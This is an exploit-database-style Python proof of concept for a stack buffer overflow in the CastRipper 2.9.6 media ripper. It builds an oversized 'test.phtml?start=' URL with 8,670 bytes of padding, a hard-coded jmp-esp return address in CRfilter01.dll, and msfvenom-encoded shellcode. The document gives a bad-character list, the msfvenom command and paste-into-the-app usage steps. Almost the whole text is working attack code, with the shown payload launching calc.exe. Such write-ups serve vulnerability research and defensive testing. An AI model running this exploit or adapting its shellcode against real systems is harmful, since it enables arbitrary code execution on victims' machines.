
# CastRipper Version 2.9.6.000 2007.06.09
# Exploit Title: Castripper 2.9.6- 'http://localhost/test.phtml?start=' HTTP Stack Buffer Overflow
# Date: 07-15-2024
# Exploit Author: Mauricio Galindo - http://www.pentesthacks.ca
# Vendor Homepage: http://www.mini-stream.net/castripper/
# Version: 2.9.6.000 2007.06.09
# Sofware Link: https://www.exploit-db.com/apps/38494a208b81181c5c832df64384dc13-CastRipper.exe
# Tested on: Windows 10 Pro 32bit Version 22H2 OS Build 19045.4651
# Usage: 
#  1.   python3 castRipperSploit.py | xclip -selection clipboard
#  2.   Open Castripper -> click on Load -> Paste on Load Field and click on Ok button (Warning Popup will show up just click ok couple of times)
# Note.: EIP (offset CRfilter01+0x3744d) may need to be adjust on your OS.

def sploit():

    # Bad Chars: 
    # \x00\x0a\x0d\x80\x82\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b
    # \x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c    
    # Payload: msfvenom -p windows/exec cmd=calc.exe  -b "\x00\x0a\x0d\x80\x82\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c" -f py  -v shellcode
    shellcode =  "\x90\x90\x90\x90\x90\x90\x81\xC4\x3C\xF6\xFF\xFF" # add esp, 2500
    shellcode += "\xdb\xcd\xd9\x74\x24\xf4\x5a\x4a\x4a\x4a\x4a"
    shellcode += "\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43"
    shellcode += "\x43\x43\x37\x52\x59\x6a\x41\x58\x50\x30\x41"
    shellcode += "\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
    shellcode += "\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42"
    shellcode += "\x75\x4a\x49\x69\x6c\x39\x78\x6e\x62\x37\x70"
    shellcode += "\x77\x70\x53\x30\x75\x30\x4b\x39\x6a\x45\x75"
    shellcode += "\x61\x39\x50\x31\x74\x6e\x6b\x66\x30\x70\x30"
    shellcode += "\x4e\x6b\x70\x52\x46\x6c\x6c\x4b\x46\x32\x74"
    shellcode += "\x54\x6c\x4b\x51\x62\x34\x68\x34\x4f\x6e\x57"
    shellcode += "\x70\x4a\x35\x76\x45\x61\x4b\x4f\x6e\x4c\x75"
    shellcode += "\x6c\x65\x31\x51\x6c\x34\x42\x74\x6c\x65\x70"
    shellcode += "\x5a\x61\x68\x4f\x76\x6d\x56\x61\x4a\x67\x69"
    shellcode += "\x72\x6b\x42\x56\x32\x66\x37\x4e\x6b\x61\x42"
    shellcode += "\x36\x70\x6c\x4b\x70\x4a\x45\x6c\x6c\x4b\x52"
    shellcode += "\x6c\x77\x61\x33\x48\x5a\x43\x33\x78\x35\x51"
    shellcode += "\x5a\x71\x33\x61\x4e\x6b\x70\x59\x35\x70\x35"
    shellcode += "\x51\x39\x43\x6e\x6b\x33\x79\x37\x68\x58\x63"
    shellcode += "\x35\x6a\x50\x49\x6c\x4b\x56\x54\x4e\x6b\x67"
    shellcode += "\x71\x49\x46\x64\x71\x6b\x4f\x4c\x6c\x69\x51"
    shellcode += "\x68\x4f\x64\x4d\x55\x51\x79\x57\x44\x78\x6d"
    shellcode += "\x30\x64\x35\x79\x66\x63\x33\x63\x4d\x59\x68"
    shellcode += "\x55\x6b\x31\x6d\x71\x34\x43\x45\x38\x64\x62"
    shellcode += "\x78\x6e\x6b\x50\x58\x64\x64\x55\x51\x6b\x63"
    shellcode += "\x51\x76\x4e\x6b\x74\x4c\x30\x4b\x4e\x6b\x42"
    shellcode += "\x78\x77\x6c\x55\x51\x78\x53\x4c\x4b\x73\x34"
    shellcode += "\x4e\x6b\x66\x61\x68\x50\x4c\x49\x42\x64\x51"
    shellcode += "\x34\x37\x54\x33\x6b\x53\x6b\x73\x51\x46\x39"
    shellcode += "\x51\x4a\x63\x61\x39\x6f\x6b\x50\x71\x4f\x51"
    shellcode += "\x4f\x70\x5a\x6e\x6b\x65\x42\x38\x6b\x6c\x4d"
    shellcode += "\x31\x4d\x50\x6a\x45\x51\x4c\x4d\x4d\x55\x6f"
    shellcode += "\x42\x57\x70\x43\x30\x35\x50\x72\x70\x30\x68"
    shellcode += "\x64\x71\x4c\x4b\x32\x4f\x4d\x57\x79\x6f\x7a"
    shellcode += "\x75\x6d\x6b\x68\x70\x4f\x45\x4e\x42\x73\x66"
    shellcode += "\x61\x78\x6e\x46\x4c\x55\x6d\x6d\x4d\x4d\x79"
    shellcode += "\x6f\x79\x45\x45\x6c\x37\x76\x51\x6c\x56\x6a"
    shellcode += "\x4f\x70\x69\x6b\x39\x70\x32\x55\x53\x35\x4d"
    shellcode += "\x6b\x71\x57\x35\x43\x34\x32\x30\x6f\x63\x5a"
    shellcode += "\x57\x70\x73\x63\x39\x6f\x7a\x75\x35\x33\x31"
    shellcode += "\x71\x32\x4c\x33\x53\x64\x6e\x72\x45\x62\x58"
    shellcode += "\x63\x55\x65\x50\x41\x41"
    
    buf = "http://127.0.0.1/test.phtml?start="
    buf += "C"*8670 
    buf += "\x4d\x74\x41\x02" # EIP -> jmp esp - CRfilter01.dll // offset CRfilter01+0x3744d

    buf += shellcode

    print(buf)

if __name__ == '__main__':
    sploit()


